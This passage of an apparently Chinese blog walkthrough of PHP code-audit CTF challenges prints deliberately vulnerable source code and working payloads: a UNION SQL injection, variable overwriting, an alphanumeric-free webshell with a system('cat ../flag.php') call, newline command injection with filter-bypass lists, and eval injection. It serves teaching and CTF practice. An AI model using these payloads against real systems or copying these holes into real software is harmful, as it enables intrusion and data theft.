class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>($row[pwd]) &amp;&amp; (!strcasecmp($pass, $row[pwd]))</code><br>$query中pwd列要有值<br>pwd列的值与MD5($pass)匹配<br>这里可以在username处进行实践盲注<br><img src="/2020/05/12/PHP_Code_Challenge/1588688594051.png" alt="1588688594051"></p>
<p>还可以使用联合查询注入漏洞</p>
<blockquote>
<p><code>UNION用于把来自许多SELECT语句的结果组合到一个结果集合中。 列于每个SELECT语句的对应位置的被选择的列应
具有相同的类型。（例如，被第一个语句选择的第一列应和被其它语句选择的第一列具有相同的类型。）在第一
SELECT语句中被使用的列名称也被用于结果的列名称。</code><br>其中关键是<strong>在第一个SELECT语句中被使用的列名称也被用于结果的列名称</strong><br>这意味着union后的sql语句执行结果也会被列入pwd列中<br>我们可以使union前的sql语句无结果，其后的sql语句的结果与MD5($pass)相同，使pwd列的值与MD5($pass)匹配</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588689264255.png" alt="1588689264255"></p>
<p>其中<code>c4ca4238a0b923820dcc509a6f75849b</code>为1的md5值</p>
<h1 id="challenge7"><a href="#challenge7" class="headerlink" title="challenge7"></a>challenge7</h1><p>在challenge7.txt发现源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$_403 = <span class="string">"Access Denied"</span>;</span><br><span class="line">$_200 = <span class="string">"Welcome Admin"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"BugsBunnyCTF is here :p..."</span>);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</span><br><span class="line">    <span class="keyword">die</span>($_403);</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    $$key = $$value;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    $$key = $value;</span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</span><br><span class="line">    <span class="keyword">die</span>($_403);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is your flag : "</span>. $flag . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br></pre></td></tr></table></figure>

<p>有很明显的变量覆盖漏洞。要求我们在post语句中有flag，同时在第二个foreach中有把<code>$flag</code>直接覆盖了，所以直接通过echo语句输出的flag是被修改过的。接着看看有什么输出点，比如有个<code>die($_200)</code>，结合第一个foreach的功能，我们可以在第二个foreach之前先将<code>$_200</code>的值覆盖为原flag的值。payload如下：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http://IP:PORT/challenge7.php?_200=flag</span></span><br><span class="line"></span><br><span class="line"><span class="section">POST:</span></span><br><span class="line">flag=1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589206914212.png" alt="1589206914212"></p>
<h1 id="challenge8"><a href="#challenge8" class="headerlink" title="challenge8"></a>challenge8</h1><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="string">"On"</span>);</span><br><span class="line">error_reporting(E_ALL | E_STRICT);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_string</span><span class="params">( $length )</span> </span>&#123;</span><br><span class="line">    $chars = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line">    $size = strlen( $chars );</span><br><span class="line">    $str = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>( $i = <span class="number">0</span>; $i &lt; $length; $i++)</span><br><span class="line">   &#123;</span><br><span class="line">       $str .= $chars[ rand( <span class="number">0</span>, $size - <span class="number">1</span> ) ];</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">$data = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$black_list = <span class="keyword">array</span>(<span class="string">' '</span>, <span class="string">'!'</span>, <span class="string">'"'</span>, <span class="string">'#'</span>, <span class="string">'%'</span>, <span class="string">'&amp;'</span>, <span class="string">'*'</span>, <span class="string">','</span>, <span class="string">'-'</span>, <span class="string">'/'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">':'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'?'</span>, <span class="string">'@'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">'\\'</span>, <span class="string">'^'</span>, <span class="string">'`'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'|'</span>, <span class="string">'~'</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($data, $b) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"WAF!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename=rand_string(<span class="number">0x20</span>).<span class="string">'.php'</span>;</span><br><span class="line">$folder=<span class="string">'uploads/'</span>;</span><br><span class="line">$full_filename = $folder.$filename;</span><br><span class="line"><span class="keyword">if</span>(file_put_contents($full_filename, <span class="string">'&lt;?php '</span>.$data))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;a href='"</span>.$full_filename.<span class="string">"'&gt;WebShell&lt;/a&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Enjoy your webshell~"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Some thing wrong..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>简单审计：<br>将c传入的字符串用白名单筛选，并且与<code>&lt;?php</code>拼接后写入uploads/xxxxx.php中<br>这道题过滤了很多，但没有过滤<code>$ _ [ ] &#39; &#39; ;</code>等，所以可以通过自增的方式构造无字母数字rce</p>
<blockquote>
<p>参考链接</p>
<ul>
<li><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></li>
<li><a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/186298.html</a></li>
</ul>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[].[];</span><br><span class="line">$__=<span class="string">''</span>;</span><br><span class="line">$_=$_[<span class="string">''</span>];</span><br><span class="line">$_=++$_;$_=++$_;$_=++$_;$_=++$_;</span><br><span class="line">$__.=$_; <span class="comment">// E</span></span><br><span class="line">$_=++$_;$_=++$_;</span><br><span class="line">$__=$_.$__; <span class="comment">// GE</span></span><br><span class="line">$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;</span><br><span class="line">$_=++$_;$_=++$_;$_=++$_;</span><br><span class="line">$__.=$_; <span class="comment">// GET</span></span><br><span class="line">var_dump($&#123;<span class="string">'_'</span>.$__&#125;[_]($&#123;<span class="string">'_'</span>.$__&#125;[__])); <span class="comment">// $_GET['_']($_GET['__']);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_=[].[];</span><br><span class="line">$__=<span class="string">''</span>;</span><br><span class="line">$_=$_[<span class="string">''</span>];</span><br><span class="line">$_=++$_;$_=++$_;$_=++$_;$_=++$_;</span><br><span class="line">$__.=$_;</span><br><span class="line">$_=++$_;$_=++$_;</span><br><span class="line">$__=$_.$__;</span><br><span class="line">$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;</span><br><span class="line">$_=++$_;$_=++$_;$_=++$_;</span><br><span class="line">$__.=$_;$</span><br><span class="line">&#123;<span class="string">'_'</span>.$__&#125;[_]($&#123;<span class="string">'_'</span>.$__&#125;[__]);</span><br></pre></td></tr></table></figure>

<p>将下面的那一串进行url编码后传入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%24%5f%3d%5b%5d%2e%5b%5d%3b%24%5f%5f%3d%27%27%3b%24%5f%3d%24%5f%5b%27%27%5d%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%5f%2e%3d%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%5f%3d%24%5f%2e%24%5f%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%5f%2e%3d%24%5f%3b%24%7b%27%5f%27%2e%24%5f%5f%7d%5b%5f%5d%28%24%7b%27%5f%27%2e%24%5f%5f%7d%5b%5f%5f%5d%29%3b</span><br></pre></td></tr></table></figure>

<p>接着访问出现的webshell，传入</p>
<blockquote>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="symbol">_</span>=<span class="built_in">system</span>&amp;<span class="symbol">__</span>=cat%<span class="number">20</span>../flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>即<code>system(cat%20../flag.php)</code></p>
</blockquote>
<p>查看源码得到flag<br><img src="/2020/05/12/PHP_Code_Challenge/1588840767993.png" alt="1588840767993"></p>
<h1 id="challenge9"><a href="#challenge9" class="headerlink" title="challenge9"></a>challenge9</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[ <span class="string">'ip'</span> ])) &#123;</span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">'ip'</span> ]);</span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'|'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line">    $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">        <span class="keyword">echo</span> $target;</span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>命令执行<br>payload</p>
<blockquote>
<p>?ip=127.0.0.1%0acat%20flag.php</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588841559619.png" alt="1588841559619"></p>
<p><a href="https://blog.csdn.net/silence1_/article/details/96135760" target="_blank" rel="noopener">关于命令执行以及常见的一些绕过过滤的方法</a><br>命令分隔符</p>
<blockquote>
<p>linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||<br>windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</p>
</blockquote>
<p>空格可以用以下字符串代替</p>
<blockquote>
<p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p>
</blockquote>
<h1 id="challenge10"><a href="#challenge10" class="headerlink" title="challenge10"></a>challenge10</h1><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'answer'</span>]))&#123; </span><br><span class="line">    $number = $_POST[<span class="string">'answer'</span>]; </span><br><span class="line">    <span class="keyword">if</span> (noother_says_correct($number))&#123; </span><br><span class="line">        <span class="keyword">echo</span> $flag; </span><br><span class="line">    &#125;  <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Sorry"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $one = ord(<span class="string">'1'</span>); 		<span class="comment">#ord() 函数:返回字符串的首个字符的 ASCII 值</span></span><br><span class="line">    $nine = ord(<span class="string">'9'</span>); </span><br><span class="line">    <span class="comment"># Check all the input characters! </span></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment"># Disallow all the digits! </span></span><br><span class="line">        $digit = ord($number&#123;$i&#125;); </span><br><span class="line">        <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="comment"># Aha, digit not allowed! </span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">#要求传入的每一个值都不能大于等于1小于等于9</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment"># Allow the magic number ... </span></span><br><span class="line">    <span class="keyword">return</span> $number == <span class="string">"3735929054"</span>; <span class="comment">#弱类型比较</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>noother_says_correct函数对POST的字符串每个字符做检测，如果有一个字符的ASCII码在[49,57]内则返回false，即输入的字符串不能含有1-9数字<br>返回true的条件是POST的字符串与<code>3735929054</code>等值比较返回true<br>发现16进制满足条件<br><img src="/2020/05/12/PHP_Code_Challenge/1588855862112.png" alt="1588855862112"></p>
<blockquote>
<p>0xdeadc0de</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588855895845.png" alt="1588855895845"></p>
<h1 id="challenge11"><a href="#challenge11" class="headerlink" title="challenge11"></a>challenge11</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用了<code>&#39;/^\w*$/&#39;</code>正则匹配，即要求传入的必须为字母和数字的组合<br>var_dump($$a)中存在$$a，可以输出对应的变量值,即flag,但前提是需要知道flag的变量名，可利用$GLOBALS</p>
<p>转载自：<a href="https://www.freebuf.com/column/230907.html" target="_blank" rel="noopener">https://www.freebuf.com/column/230907.html</a></p>
<p>PHP中有一个鲜为人知的超全局变量$GLOBALS。</p>
<p>$GLOBALS定义：引用全局作用域中可用的全部变量(一个包含了全部变量的组合数组。变量的名字就是数组的键)，与所有其他超全局变量不同，$GLOBALS在PHP代码中的任何地方都是可用的，可以通过打印$GLOBALS变量查看结果验证。</p>
<p>在PHP生命周期中，定义在函数体外部的全局变量，函数内部是不能直接获得的。如果要在函数体内访问外部定义的全局变量，可以通过global声明或者直接使用$GLOBALS来进行访问。</p>
<p>比如:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$var1=<span class="string">'www.tidesec.com'</span>;</span><br><span class="line">$var2=<span class="string">'www.tidesec.net'</span>;</span><br><span class="line">test();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $var1=<span class="string">'tide'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $var1,<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">    <span class="keyword">global</span> $var1;</span><br><span class="line">    <span class="keyword">echo</span> $var1,<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $GLOBALS[<span class="string">'var2'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tide</span><br><span class="line">www.tidesec.com</span><br><span class="line">www.tidesec.net</span><br></pre></td></tr></table></figure>

<p>其中global和$GLOBALS的区别:</p>
<p>$GLOBALS[‘var’]是外部全局变量的本身，而global $var则是外部$var的同名引用或者说是指针，也就是说global函数产生一个指向函数外部变量的别名变量，而不是真正的函数外部变量，而$GLOBALS[]确确实实调用的是外部的变量，函数内外都会始终保持一致。</p>
<p>举个例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$var1=tide;</span><br><span class="line">$var2=tidesec;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $GLOBALS[<span class="string">'var2'</span>]=&amp;$GLOBALS[<span class="string">'var1'</span>];</span><br><span class="line">&#125;  </span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> $var2;</span><br></pre></td></tr></table></figure>

<p>结果为:</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tide</span></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$var1=tide;</span><br><span class="line">$var2=tidesec;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $var1,$var2;</span><br><span class="line">    $var2=&amp;$var1;</span><br><span class="line">&#125;  </span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> $var2;</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tidesec</span></span><br></pre></td></tr></table></figure>

<p>结果之所以为tidesec，原因为$var1的引用指向了$var2的引用地址。导致实质的值没有发生变化。</p>
<hr>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$var1=tide;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $var1;</span><br><span class="line">    <span class="keyword">unset</span>($var1);</span><br><span class="line">&#125;  </span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> $var1;</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tide</span></span><br></pre></td></tr></table></figure>

<p>这就说明，删除的只是别名或者说是引用，其本身作用的值没有受到任何的影响。也就是说，global $var其实是$var = &amp;$GLOBALS[‘var’]，调用外部变量的一个别名而已</p>
<p>所以本题传入</p>
<blockquote>
<p>GLOBALS</p>
</blockquote>
<p>即可<br><img src="/2020/05/12/PHP_Code_Challenge/1588857266864.png" alt="1588857266864"></p>
<h1 id="challenge12"><a href="#challenge12" class="headerlink" title="challenge12"></a>challenge12</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>与challenge11思想一样<br><img src="/2020/05/12/PHP_Code_Challenge/1588857952191.png" alt="1588857952191"></p>
<p>也可以直接构造</p>
<blockquote>
<p>);var_dump(file(“flag.php”));//</p>
</blockquote>
<h1 id="challenge13"><a href="#challenge13" class="headerlink" title="challenge13"></a>challenge13</h1><p>源码：</p>
